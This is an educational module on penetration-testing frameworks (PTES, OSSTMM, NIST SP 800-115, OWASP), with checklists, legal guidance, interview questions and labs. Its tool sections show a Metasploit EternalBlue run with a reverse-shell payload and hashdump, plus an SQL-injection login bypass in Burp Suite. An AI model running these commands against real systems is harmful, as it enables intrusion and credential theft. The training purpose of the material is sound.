# Methodology & Frameworks

## What is it?

Penetration testing methodologies provide structured, repeatable, and defensible approaches to conducting security assessments. Rather than ad-hoc hacking, formalized frameworks define phases, deliverables, quality gates, and ethical boundaries that transform vulnerability hunting into a professional discipline. Frameworks like PTES, OSSTMM, NIST SP 800-115, and the OWASP Testing Guide each bring a distinct lens — from full-scope adversary simulation to focused web application assessment — but all share a common goal: ensure thorough coverage, legal compliance, and actionable results.

## Why Learn It?

Without a formal methodology, penetration tests become inconsistent, incomplete, and legally vulnerable. Frameworks provide:

- **Consistency**: Every test follows the same phases regardless of who performs it
- **Coverage**: No critical area is skipped or under-tested
- **Credibility**: Clients and auditors trust results backed by recognized standards
- **Legal Protection**: Pre-engagement rules of engagement and scope definitions protect both tester and client
- **Communication**: Standardized reporting structures ensure findings reach both technical teams and executives

Organizations increasingly mandate adherence to specific frameworks before approving penetration tests. Understanding these methodologies is foundational for any security professional.

## You Will Learn

- PTES phases: Pre-engagement, Intelligence Gathering, Vulnerability Analysis, Exploitation, Post-Exploitation, Reporting
- OSSTMM IAVM (Information Assurance Verification Model) and operational test metrics
- NIST SP 800-115 technical guide to information security testing and assessment
- OWASP Testing Guide v4 methodology for web application assessments
- Testing phases and methodology flowcharts
- Legal and ethical considerations including scope, authorization, and responsible disclosure

## Prerequisites

- All previous sections (Fundamentals, Networking, Linux, Windows, etc.)

## Related Topics

- Reporting
- Legal & Compliance
- Scanning & Enumeration
- Exploitation

---

## Layer Position Diagram

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    PENETRATION TESTING LIFECYCLE                        │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  ┌──────────────┐    ┌──────────────┐    ┌──────────────┐              │
│  │ PRE-ENGAGE-  │───▶│  INTELLIGENCE│───▶│VULNERABILITY │              │
│  │   MENT       │    │  GATHERING   │    │  ANALYSIS    │              │
│  │              │    │              │    │              │              │
│  │ • Rules of   │    │ • Passive   │    │ • Service    │              │
│  │   Engagement │    │   Recon     │    │   Analysis   │              │
│  │ • Scope      │    │ • Active    │    │ • Vuln Scan  │              │
│  │ • Legal Auth │    │   Recon     │    │ • Risk Rank  │              │
│  │ • NDA        │    │ • OSINT     │    │              │              │
│  └──────────────┘    └──────────────┘    └──────┬───────┘              │
│                                                   │                     │
│                                                   ▼                     │
│  ┌──────────────┐    ┌──────────────┐    ┌──────────────┐              │
│  │  REPORTING   │◀───│POST-EXPLOIT- │◀───│EXPLOITATION  │              │
│  │              │    │   ATION      │    │              │              │
│  │ • Executive  │    │ • Persistence│    │ • Initial    │              │
│  │   Summary    │    │ • Lateral    │    │   Access     │              │
│  │ • Technical  │    │   Movement   │    │ • Validation │              │
│  │   Findings   │    │ • Priv Esc   │    │ • Chain      │              │
│  │ • Remediation│    │ • Exfil      │    │   Building   │              │
│  └──────────────┘    └──────────────┘    └──────────────┘              │
│                                                                         │
│  ◀══════════════ CONTINUOUS QUALITY GATES ════════════════▶            │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## PTES (Penetration Testing Execution Standard)

PTES is a comprehensive framework that defines the minimum standard for performing penetration tests. It was created by a consortium of security professionals to standardize the industry.

### Phase 1: Pre-Engagement

The foundation of every professional penetration test. This phase establishes legal authority, scope, and expectations.

```
┌─────────────────────────────────────────────────────────────────┐
│                    PRE-ENGAGEMENT CHECKLIST                      │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  □ Define scope (IP ranges, domains, applications, exclusions)  │
│  □ Obtain written authorization (Rules of Engagement)           │
│  □ Execute Non-Disclosure Agreement (NDA)                       │
│  □ Establish communication channels and escalation paths        │
│  □ Define test window (dates, times, business hours)            │
│  □ Identify contacts (technical, management, legal)             │
│  □ Agree on deliverables and report format                      │
│  □ Obtain emergency contact information                         │
│  □ Define success criteria and acceptable risk levels           │
│  □ Review insurance requirements                                │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

**Key Documents:**
- **Statement of Work (SOW)**: Defines deliverables, timeline, and pricing
- **Rules of Engagement (ROE)**: Specifies what is allowed and prohibited
- **Authorization Letter**: Legal permission to test (signed by asset owner)
- **NDA**: Protects confidential information discovered during testing

**Rules of Engagement Example:**

```markdown
## Rules of Engagement — Acme Corp Web Application Test

### Scope
- Target: https://app.acmecorp.com (including *.app.acmecorp.com)
- IP Range: 203.0.113.0/24
- Exclusions: Production database servers (10.0.2.100-110)

### Testing Window
- Start: 2024-01-15 08:00 UTC
- End: 2024-01-26 18:00 UTC
- No testing during maintenance windows (Sundays 02:00-06:00 UTC)

### Permitted Activities
- Network port scanning (rate limited to 100 packets/sec)
- Web application vulnerability testing
- Social engineering (pre-approved phishing campaign)
- Physical security testing: NOT AUTHORIZED

### Prohibited Activities
- Denial of Service attacks
- Data exfiltration of PII
- Modification of production data
- Accessing systems outside defined scope
- Third-party service disruption

### Emergency Contact
- Primary: John Smith (CISO) — +1-555-0100
- Secondary: SOC Team — soc@acmecorp.com
- Escalation: Legal department — legal@acmecorp.com
```

### Phase 2: Intelligence Gathering (Reconnaissance)

Systematic collection of information about the target from public and authorized sources.

**PTES Intelligence Gathering Categories:**

```
┌─────────────────────────────────────────────────────────────┐
│              INTELLIGENCE GATHERING DOMAINS                  │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐         │
│  │  TECHNICAL  │  │   HUMAN     │  │ PHYSICAL    │         │
│  │             │  │             │  │             │         │
│  │ • DNS       │  │ • Social    │  │ • Building  │         │
│  │ • WHOIS     │  │   Media     │  │   Layout    │         │
│  │ • IP Ranges │  │ • LinkedIn  │  │ • Badge     │         │
│  │ • Netblocks │  │ • Phishing  │  │   Systems   │         │
│  │ • Tech Stack│  │ • Pretext   │  │ • Camera    │         │
│  │ • Email     │  │   Calling   │  │   Locations │         │
│  │   Harvesting│  │ • Job Posts │  │ • Visitor    │         │
│  │ • Leaked    │  │ • Trade Show│  │   Policies  │         │
│  │   Creds     │  │   Intel     │  │             │         │
│  └─────────────┘  └─────────────┘  └─────────────┘         │
│                                                              │
│  ┌───────────────────────────────────────────────────┐      │
│  │                  OPEN SOURCE (OSINT)               │      │
│  │                                                    │      │
│  │  Search Engines  →  Social Networks  →  Archives  │      │
│  │  Job Boards      →  Code Repos      →  Forums    │      │
│  │  Paste Sites     →  WHOIS/DNS       →  Shodan    │      │
│  └───────────────────────────────────────────────────┘      │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### Phase 3: Vulnerability Analysis

Mapping discovered services and configurations to known vulnerabilities and weaknesses.

**Key Activities:**
- Service version identification and comparison to CVE databases
- Default credential testing
- Configuration review against benchmarks (CIS, DISA STIGs)
- Web application vulnerability scanning
- Manual verification of scanner findings
- Risk prioritization using CVSS scoring

### Phase 4: Exploitation

Controlled exploitation of identified vulnerabilities to gain access and demonstrate impact.

**Exploitation Hierarchy:**

```
┌─────────────────────────────────────────────────────────────┐
│                EXPLOITATION HIERARCHY                        │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  Level 1: No Access                                         │
│    └─▶ Vulnerability exists but no exploitation            │
│                                                              │
│  Level 2: Limited Access                                    │
│    └─▶ Low-privilege shell on single system                │
│                                                              │
│  Level 3: User Access                                       │
│    └─▶ Authenticated access to application/system          │
│                                                              │
│  Level 4: Administrative Access                             │
│    └─▶ Root/admin on single system                         │
│                                                              │
│  Level 5: Domain/System Compromise                          │
│    └─▶ Domain admin, full network control                  │
│                                                              │
│  Level 6: Data Exfiltration                                 │
│    └─▶ Sensitive data extracted (proof of impact)          │
│                                                              │
│  Level 7: Persistence                                       │
│    └─▶ Maintained access across reboots/detected           │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### Phase 5: Post-Exploitation

Determining the value of compromised systems and demonstrating business impact.

### Phase 6: Reporting

Comprehensive documentation of all findings, evidence, and remediation guidance.

---

## OSSTMM (Open Source Security Testing Methodology Manual)

OSSTMM, developed by ISECOM, focuses on operational testing metrics and provides a scientific approach to security testing through the IAVM (Information Assurance Verification Model).

### OSSTMM Test Types

```
┌─────────────────────────────────────────────────────────────────────┐
│                     OSSTMM TEST TYPES                                │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐              │
│  │  RAST        │  │  CAST        │  │  SPTEST      │              │
│  │ (Remote      │  │ (Compliance  │  │ (Special     │              │
│  │  Assessment  │  │  Assessment  │  │  Tests)      │              │
│  │  of Security │  │  of Security │  │              │              │
│  │  Technologies│  │  Technologies│  │ • Wireless   │              │
│  │              │  │              │  │ • Physical   │              │
│  │ • Network    │  │ • Regulatory │  │ • Social     │              │
│  │   Services   │  │   Compliance │  │ • App Layer  │              │
│  │ • App Layer  │  │ • Standards  │  │              │              │
│  │   Services   │  │   Adherence  │  │              │              │
│  └──────────────┘  └──────────────┘  └──────────────┘              │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

### OSSTMM Operational Test Metrics

OSSTMM uniquely provides quantifiable metrics for security posture:

- **RAV (Risk Assessment Values)**: Numeric scores across exposure, vulnerability, and resistance
- ** Exposure Vector**: How many attack surfaces are accessible
- **Vulnerability Vector**: Number and severity of weaknesses found
- **Resistance Vector**: Effectiveness of existing controls
- **Trust Metrics**: Authentication strength and trust boundaries

### OSSTMM vs PTES Comparison

| Aspect | OSSTMM | PTES |
|--------|--------|------|
| Focus | Metrics-driven testing | Adversary simulation |
| Phases | 4 main phases (RAV, CAST, SPTEST, RAV Metrics) | 6 phases (Pre-engagement through Reporting) |
| Output | Quantifiable security scores | Detailed vulnerability narratives |
| Best For | Compliance validation, security benchmarking | Full-scope penetration testing |
| Standard | IAVM model | Industry-standard methodology |
| Uniqueness | Scientific measurement approach | Actionable remediation focus |

---

## NIST SP 800-115

The NIST Special Publication 800-115, "Technical Guide to Information Security Testing and Assessment," provides federal agencies and organizations a structured approach to security testing.

### NIST Testing Categories

```
┌─────────────────────────────────────────────────────────────────┐
│              NIST SP 800-115 TESTING CATEGORIES                 │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │               TEST PLANNING & PREPARATION                │   │
│  │  • Define testing strategy                               │   │
│  │  • Identify target systems                               │   │
│  │  • Determine testing tools and techniques                │   │
│  │  • Establish rules of engagement                         │   │
│  └──────────────────────────┬───────────────────────────────┘   │
│                              │                                    │
│           ┌──────────────────┼──────────────────┐                │
│           ▼                  ▼                  ▼                │
│  ┌────────────────┐ ┌────────────────┐ ┌────────────────┐      │
│  │  TECHNICAL     │ │  MANAGERIAL    │ │  OPERATIONAL   │      │
│  │  TESTING       │ │  TESTING       │ │  TESTING       │      │
│  │                │ │                │ │                │      │
│  │ • Vulnerability│ │ • Policy       │ │ • Social       │      │
│  │   Scanning     │ │   Compliance   │ │   Engineering  │      │
│  │ • Penetration  │ │ • Configuration│ │ • Physical     │      │
│  │   Testing      │ │   Reviews      │ │   Security     │      │
│  │ • Wireless     │ │ • Audit Log    │ │ • Personnel    │      │
│  │   Testing      │ │   Analysis     │ │   Security     │      │
│  └────────────────┘ └────────────────┘ └────────────────┘      │
│           │                  │                  │                │
│           └──────────────────┼──────────────────┘                │
│                              ▼                                    │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │                  ASSESSMENT & REPORTING                   │   │
│  │  • Analyze results                                       │   │
│  │  • Prioritize findings                                   │   │
│  │  • Develop remediation plan                              │   │
│  │  • Document and report                                   │   │
│  └──────────────────────────────────────────────────────────┘   │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### NIST Penetration Testing Steps

1. **Plan and Prepare**: Define scope, obtain authorization, select team
2. **Conduct Technical Assessment**: Vulnerability scanning, penetration testing, wireless testing
3. **Analyze Results**: Correlate findings, eliminate false positives, prioritize risks
4. **Report**: Document methodology, findings, and recommendations
5. **Mitigate and Validate**: Implement fixes and verify effectiveness

### NIST Control Testing Matrix

| Control Family | Testing Method | Example |
|---------------|----------------|---------|
| Access Control (AC) | Penetration test | Attempt privilege escalation |
| Audit (AU) | Log review | Verify all admin actions logged |
| Configuration (CM) | Configuration scan | Check CIS benchmark compliance |
| Incident Response (IR) | Tabletop exercise | Simulate breach scenario |
| Risk Assessment (RA) | Vulnerability scan | Nessus/OpenVAS scan |
| System Protection (SC) | Penetration test | Exploit known vulnerabilities |

---

## OWASP Testing Guide

The OWASP Testing Guide v4 is the industry standard for web application security assessment, providing a comprehensive methodology organized around 11 testing categories.

### OWASP Testing Categories

```
┌─────────────────────────────────────────────────────────────────┐
│                  OWASP TESTING GUIDE v4                          │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │              INFORMATION GATHERING                        │   │
│  │  1. Reconnaissance & Mapping                             │   │
│  │  2. Configuration & Deployment Management Testing        │   │
│  │  3. Authentication Testing                               │   │
│  │  4. Authorization Testing                                │   │
│  │  5. Session Management Testing                           │   │
│  └──────────────────────────────────────────────────────────┘   │
│                              │                                    │
│                              ▼                                    │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │              INPUT VALIDATION TESTING                     │   │
│  │  6. Error Handling                                       │   │
│  │  7. Cryptography                                         │   │
│  │  8. Business Logic Testing                               │   │
│  └──────────────────────────────────────────────────────────┘   │
│                              │                                    │
│                              ▼                                    │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │              CLIENT-SIDE TESTING                          │   │
│  │  9. Client-side Testing                                  │   │
│  │  10. AJAX Testing                                       │   │
│  │  11. HTML5 Testing                                       │   │
│  └──────────────────────────────────────────────────────────┘   │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### OWASP Testing Phases

**Phase 1: Before Development (Requirements)**
- Define security requirements
- Establish secure coding standards
- Threat modeling

**Phase 2: During Development (Design & Implementation)**
- Code reviews
- Static analysis (SAST)
- Unit testing for security

**Phase 3: During Deployment (Verification)**
- Dynamic analysis (DAST)
- Penetration testing
- Configuration review

**Phase 4: During Maintenance (Operations)**
- Continuous monitoring
- Patch management
- Regression testing

### OWASP Top 10 (2021) Integration

The OWASP Testing Guide directly maps to the OWASP Top 10 vulnerabilities:

| OWASP Top 10 | Testing Methods |
|--------------|-----------------|
| A01: Broken Access Control | Authorization testing, forced browsing |
| A02: Cryptographic Failures | TLS configuration review, crypto analysis |
| A03: Injection | SQL injection, XSS, command injection testing |
| A04: Insecure Design | Threat modeling, business logic testing |
| A05: Security Misconfiguration | Configuration review, default credentials |
| A06: Vulnerable Components | Software composition analysis |
| A07: Auth Failures | Brute force, credential stuffing tests |
| A08: Data Integrity Failures | Deserialization, CI/CD pipeline testing |
| A09: Logging Failures | Log review, monitoring validation |
| A10: SSRF | Server-side request forgery testing |

---

## Testing Phases and Methodology

### Universal Testing Flow

```
┌─────────────────────────────────────────────────────────────────┐
│              UNIVERSAL TESTING METHODOLOGY FLOW                  │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ┌─────────────┐                                               │
│  │   START     │                                               │
│  └──────┬──────┘                                               │
│         ▼                                                       │
│  ┌─────────────────────────────────────────────┐               │
│  │  1. DEFINE SCOPE & OBJECTIVES               │               │
│  │     • What systems are in scope?            │               │
│  │     • What testing is authorized?           │               │
│  │     • What are the success criteria?        │               │
│  └────────────────────┬────────────────────────┘               │
│                       ▼                                         │
│  ┌─────────────────────────────────────────────┐               │
│  │  2. GATHER INTELLIGENCE                      │               │
│  │     • Passive OSINT collection              │               │
│  │     • Active reconnaissance                 │               │
│  │     • Technology stack identification        │               │
│  └────────────────────┬────────────────────────┘               │
│                       ▼                                         │
│  ┌─────────────────────────────────────────────┐               │
│  │  3. MAP ATTACK SURFACE                       │               │
│  │     • Port scanning                         │               │
│  │     • Service enumeration                   │               │
│  │     • Application mapping                   │               │
│  └────────────────────┬────────────────────────┘               │
│                       ▼                                         │
│  ┌─────────────────────────────────────────────┐               │
│  │  4. IDENTIFY VULNERABILITIES                 │               │
│  │     • Vulnerability scanning                │               │
│  │     • Manual analysis                       │               │
│  │     • Configuration review                  │               │
│  └────────────────────┬────────────────────────┘               │
│                       ▼                                         │
│  ┌─────────────────────────────────────────────┐               │
│  │  5. EXPLOIT VULNERABILITIES                  │               │
│  │     • Prove vulnerability is real           │               │
│  │     • Demonstrate business impact           │               │
│  │     • Document exploitation steps           │               │
│  └────────────────────┬────────────────────────┘               │
│                       ▼                                         │
│  ┌─────────────────────────────────────────────┐               │
│  │  6. POST-EXPLOITATION                        │               │
│  │     • Determine data access                 │               │
│  │     • Test lateral movement                 │               │
│  │     • Assess persistence options            │               │
│  └────────────────────┬────────────────────────┘               │
│                       ▼                                         │
│  ┌─────────────────────────────────────────────┐               │
│  │  7. REPORT & REMEDIATE                       │               │
│  │     • Document all findings                 │               │
│  │     • Provide remediation guidance          │               │
│  │     • Present to stakeholders               │               │
│  └────────────────────┬────────────────────────┘               │
│                       ▼                                         │
│  ┌─────────────────┐                                           │
│  │      END        │                                           │
│  └─────────────────┘                                           │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### Testing Types

```
┌─────────────────────────────────────────────────────────────────┐
│                     PENETRATION TEST TYPES                       │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ┌──────────────────┐  ┌──────────────────┐                    │
│  │  BLACK BOX       │  │  WHITE BOX       │                    │
│  │                  │  │                  │                    │
│  │  No prior        │  │  Full knowledge  │                    │
│  │  knowledge       │  │  of systems,     │                    │
│  │  of target       │  │  source code,    │                    │
│  │                  │  │  credentials     │                    │
│  │  Simulates       │  │                  │                    │
│  │  external        │  │  Thorough and    │                    │
│  │  attacker        │  │  efficient       │                    │
│  └──────────────────┘  └──────────────────┘                    │
│                                                                  │
│  ┌──────────────────┐  ┌──────────────────┐                    │
│  │  GREY BOX        │  │  RED TEAM        │                    │
│  │                  │  │                  │                    │
│  │  Partial         │  │  Full adversary  │                    │
│  │  knowledge       │  │  simulation      │                    │
│  │  (e.g., user     │  │                  │                    │
│  │  credentials)    │  │  Includes social │                    │
│  │                  │  │  engineering,    │                    │
│  │  Balance of      │  │  physical,       │                    │
│  │  speed and       │  │  cyber           │                    │
│  │  realism         │  │                  │                    │
│  └──────────────────┘  └──────────────────┘                    │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

---

## Legal and Ethical Considerations

### Legal Framework for Penetration Testing

```
┌─────────────────────────────────────────────────────────────────┐
│              LEGAL CONSIDERATIONS CHECKLIST                       │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  BEFORE TESTING:                                                │
│  □ Written authorization from asset owner                       │
│  □ Signed Rules of Engagement                                   │
│  □ Non-Disclosure Agreement                                     │
│  □ Scope clearly defined (IP ranges, applications, exclusions)  │
│  □ Testing window agreed upon                                   │
│  □ Emergency contacts established                               │
│  □ Insurance requirements verified                              │
│  □ Legal counsel review of engagement terms                     │
│                                                                  │
│  DURING TESTING:                                                │
│  □ Stay within authorized scope                                 │
│  □ Document all actions taken                                   │
│  □ Stop if unintended damage occurs                             │
│  □ Use minimum force necessary                                  │
│  □ Respect system availability                                  │
│  □ No data exfiltration of real PII                             │
│  □ Maintain chain of custody for evidence                       │
│                                                                  │
│  AFTER TESTING:                                                 │
│  □ Securely deliver report to authorized parties                │
│  □ Destroy test credentials and implants                        │
│  □ Remove all testing artifacts                                 │
│  □ Provide remediation support                                  │
│  □ Maintain confidentiality per NDA                             │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### Key Legal Concepts

| Concept | Description |
|---------|-------------|
| **Authorization** | Written permission from asset owner — the single most critical document |
| **Scope** | Explicit boundaries of what may and may not be tested |
| **Computer Fraud and Abuse Act (CFAA)** | US federal law criminalizing unauthorized computer access |
| **General Data Protection Regulation (GDPR)** | EU regulation protecting personal data — penetration testers must handle PII carefully |
| **Responsible Disclosure** | Coordinated vulnerability disclosure process when finding zero-days |
| **Liability Protection** | Insurance and legal protections for authorized testing activities |

### Ethical Guidelines

1. **Do No Harm**: Minimize disruption to systems and services
2. **Respect Privacy**: Do not access or exfiltrate personal data beyond what is necessary
3. **Act in Good Faith**: Report all findings honestly, including those favorable to the defender
4. **Maintain Confidentiality**: Protect all information gathered during testing
5. **Stay Within Scope**: Never exceed the authorized testing boundaries
6. **Document Everything**: Maintain a complete audit trail of all actions

### Common Legal Pitfalls

```
⚠️  WARNING — COMMON LEGAL PITFALLS

1. Testing without written authorization
   → Even with verbal approval, always get written authorization

2. Testing out of scope
   → If you discover a vulnerability on an adjacent system, STOP
     and request scope expansion in writing

3. Exceeding testing window
   → Testing outside authorized hours can violate agreements

4. Causing denial of service
   → Aggressive scanning or exploitation that disrupts services

5. Handling real PII
   → Use synthetic data or anonymize during testing

6. Third-party systems
   → Cloud providers, CDNs, and third-party services may have
     separate authorization requirements

7. Cross-jurisdictional issues
   → International testing may involve multiple legal frameworks
```

---

## Tool Usage: Metasploit Framework

```bash
# Metasploit Framework — Starting and basic usage
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Use an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target parameters
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.10.8
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.14.5
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LPORT 4444

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Run exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

# Post-exploitation commands
meterpreter > sysinfo
meterpreter > getuid
meterpreter > hashdump
meterpreter > shell
```

---

## Tool Usage: Burp Suite

```bash
# Burp Suite — Web Application Testing Workflow

# 1. Configure browser proxy to Burp (127.0.0.1:8080)

# 2. Intercept requests in Proxy tab
# Navigate to target application
# Requests appear in Burp Proxy for inspection

# 3. Send requests to Repeater for manual testing
# Right-click request → Send to Repeater

# 4. Test for SQL Injection in Repeater
# Modify parameters:
# Original: username=admin&password=test
# Modified: username=admin'--&password=test

# 5. Use Intruder for automated attacks
# Right-click request → Send to Intruder
# Set positions: username=§admin§&password=§test§
# Load payload lists for brute force or fuzzing

# 6. Run Spider/Scanner for automatic discovery
# Target → Site map → Right-click domain → Actively scan

# 7. Analyze results in Dashboard
# Vulnerabilities listed by severity (High/Medium/Low/Info)
```

---

## Real-World Scenario: Full PTES Engagement

**Scenario**: ACME Corp hires your firm to perform a full-scope penetration test on their external-facing infrastructure.

```
┌─────────────────────────────────────────────────────────────────┐
│            PTES ENGAGEMENT — ACME CORP SCENARIO                  │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  PRE-ENGAGEMENT:                                               │
│  • Signed ROE and NDA on file                                  │
│  • Scope: acmecorp.com, 203.0.113.0/24, mobile app            │
│  • 2-week testing window                                      │
│  • Emergency contact: CISO + SOC                               │
│                                                                  │
│  INTELLIGENCE GATHERING:                                        │
│  • WHOIS: registrar = GoDaddy, created 2010                    │
│  • DNS: mail.acmecorp.com → Exchange Online (Microsoft 365)   │
│  • LinkedIn: 3 developers post about "ASP.NET Core"           │
│  • GitHub: Leaked API key in commit history                    │
│  • Job postings: "Experience with PostgreSQL, Redis"           │
│                                                                  │
│  VULNERABILITY ANALYSIS:                                        │
│  • Nmap: Ports 80, 443, 3306, 6379 open                       │
│  • MySQL exposed to internet (port 3306)                       │
│  • Redis exposed with no authentication (port 6379)            │
│  • Web app: SQL injection in login form                        │
│  • Default admin credentials on Jenkins (port 8080)            │
│                                                                  │
│  EXPLOITATION:                                                  │
│  • Redis unauthorized access → write SSH key → root shell      │
│  • SQL injection → extract admin password hash                 │
│  • Jenkins credential → access Git repository                  │
│  • Found AWS credentials in Git → S3 bucket access             │
│                                                                  │
│  POST-EXPLOITATION:                                             │
│  • Lateral movement: Jenkins → build server → production       │
│  • Data exfiltration: customer database (50K records)         │
│  • Persistence: SSH keys + Jenkins job modification            │
│                                                                  │
│  REPORTING:                                                     │
│  • Executive summary: CRITICAL risk, immediate action needed   │
│  • 12 findings (3 critical, 4 high, 3 medium, 2 low)          │
│  • Remediation plan with 30/60/90 day milestones               │
│  • Presentation to board and technical team                     │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

---

## Security Perspective

### From the Attacker's Viewpoint

- Methodologies provide structure that prevents missed opportunities
- Pre-engagement rules protect the tester legally
- PTES hierarchy helps prioritize targets by impact
- OSSTMM metrics provide quantifiable proof of risk

### From the Defender's Viewpoint

- Understanding penetration testing methodologies helps anticipate attacker approaches
- Knowing PTES phases enables better detection at each stage
- OSSTMM metrics can benchmark security posture over time
- OWASP Testing Guide helps developers build secure applications

### From the Organization's Viewpoint

- Formal methodologies provide audit trails for compliance
- Standardized reporting enables risk-based decision making
- Frameworks help justify security investments with quantified risk
- Regular testing according to methodology improves security maturity

---

## Interview Questions

**Q1: What is the difference between PTES and NIST SP 800-115?**
A: PTES is specifically focused on penetration testing execution with detailed phase guidance. NIST SP 800-115 is broader, covering technical testing, managerial testing, and operational testing. PTES is more prescriptive for penetration testers, while NIST provides a framework for organizations to plan and manage all security testing activities.

**Q2: When would you choose OSSTMM over PTES?**
A: OSSTMM when you need quantifiable security metrics and benchmarking (RAV scores). PTES when you need a detailed operational methodology for full-scope penetration testing. OSSTMM is better for compliance and measurement; PTES is better for adversary simulation.

**Q3: What is the most critical document before starting a penetration test?**
A: Written authorization (Rules of Engagement and signed authorization letter). Without it, testing is illegal under computer fraud laws regardless of intent.

**Q4: How does the OWASP Testing Guide differ from PTES?**
A: OWASP focuses specifically on web application security testing with detailed test cases for web vulnerabilities. PTES covers all types of penetration testing (network, application, social engineering) with a broader scope.

**Q5: What are the consequences of testing outside the defined scope?**
A: Legal liability (potential criminal charges under CFAA), contract breach, loss of professional credibility, and potential damage to client systems. Always stop and request scope expansion in writing.

---

## Hands-on Labs

### Lab 1: Rules of Engagement Exercise

```markdown
Exercise: Create a Rules of Engagement document for a penetration test
against a fictional company (TechStart Inc.)

Requirements:
1. Define scope (network range, applications, exclusions)
2. Define testing window and constraints
3. Establish communication procedures
4. Create emergency escalation matrix
5. Define data handling procedures

Deliverable: Complete ROE document ready for client review
```

### Lab 2: PTES Methodology Mapping

```
Given a fictional web application (DVWA or WebGoat):

1. Document each PTES phase for this specific target
2. Create pre-engagement checklist specific to web app testing
3. Map intelligence gathering findings to attack vectors
4. Prioritize vulnerabilities using PTES risk framework
5. Draft preliminary report outline

Tools: DVWA, WebGoat, standard penetration testing tools
```

### Lab 3: OWASP Testing Guide Walkthrough

```
Using OWASP WebGoat or Juice Shop:

1. Complete at least 5 OWASP test cases from different categories
2. Document each test case with:
   - Test ID and name
   - Steps performed
   - Expected vs actual result
   - Evidence (screenshots, request/response)
3. Map findings to OWASP Top 10 categories
4. Create remediation recommendations

Duration: 4 hours per test case category
```

---

## Summary Table

| Framework | Focus Area | Best For | Output | Key Differentiator |
|-----------|-----------|----------|--------|-------------------|
| **PTES** | Full-scope penetration testing | Professional pentesters | Detailed findings + remediation | 6-phase structured methodology |
| **OSSTMM** | Security testing metrics | Benchmarking & compliance | Quantifiable RAV scores | Scientific measurement approach |
| **NIST SP 800-115** | Information security testing | Organizations & agencies | Assessment reports | Comprehensive testing categories |
| **OWASP Testing Guide** | Web application security | Web app pentesters & developers | Web vulnerability findings | Detailed web-specific test cases |

## Quick Reference: Choosing a Framework

```
┌─────────────────────────────────────────────────────────────────┐
│              FRAMEWORK SELECTION DECISION TREE                   │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  What type of test are you performing?                          │
│                                                                  │
│  ├─▶ Full-scope network penetration test ──────▶ PTES          │
│  │                                                                │
│  ├─▶ Web application security assessment ─────▶ OWASP TG        │
│  │                                                                │
│  ├─▶ Security posture benchmarking ───────────▶ OSSTMM          │
│  │                                                                │
│  ├─▶ Compliance-driven assessment ────────────▶ NIST 800-115    │
│  │                                                                │
│  └─▶ Red team / adversary simulation ─────────▶ PTES + MITRE   │
│                                                                  │
│  Note: Most professional engagements combine elements from       │
│  multiple frameworks based on scope and objectives.              │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

---

## Resources

**Books:**
- "Penetration Testing" by Georgia Weidman
- "The Web Application Hacker's Handbook"
- "PTES: Penetration Testing Execution Standard" (official documentation)

**Videos:**
- PTES official documentation videos
- NIST webinars on security testing
- SANS webcasts on penetration testing methodologies

**Documentation:**
- PTES: http://www.pentest-standard.org
- OSSTMM: https://www.isecom.org
- NIST SP 800-115: https://csrc.nist.gov/publications/detail/sp/800-115/final
- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/

**RFCs:**
- RFC 2119 (Key words for use in RFCs)
- RFC 4949 (Internet Security Glossary)
